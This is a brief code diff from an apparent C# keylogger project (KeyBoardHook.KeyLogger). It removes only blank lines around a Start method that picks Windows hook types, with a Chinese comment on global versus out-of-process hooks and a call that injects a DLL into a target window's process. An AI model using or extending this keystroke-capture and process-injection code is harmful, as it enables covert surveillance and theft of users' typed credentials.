@@ -89,9 +89,7 @@ namespace KeyBoardHook.KeyLogger.Service
         // SetWindowsHookEx设定的全局钩子必须被注入到别的进程中，所以就无法截取到一些有限制的进程的消息，比如命令行窗口(console window)。而SetWinEventHook的进程外钩子就没有这个限制
         public void Start(string type,string className ,string title)
         {
-
             IntPtr threadId = IntPtr.Zero;
-
             IntPtr moduleHandle;
             IntPtr hMod;
             switch (type)
@@ -112,7 +110,6 @@ namespace KeyBoardHook.KeyLogger.Service
                     _activeWindowHook.Hook(threadId);
                     break;
                 case "指定窗口进程钩子":
-
                     // injectionCCharpDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
                     injectionCDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
                     break;
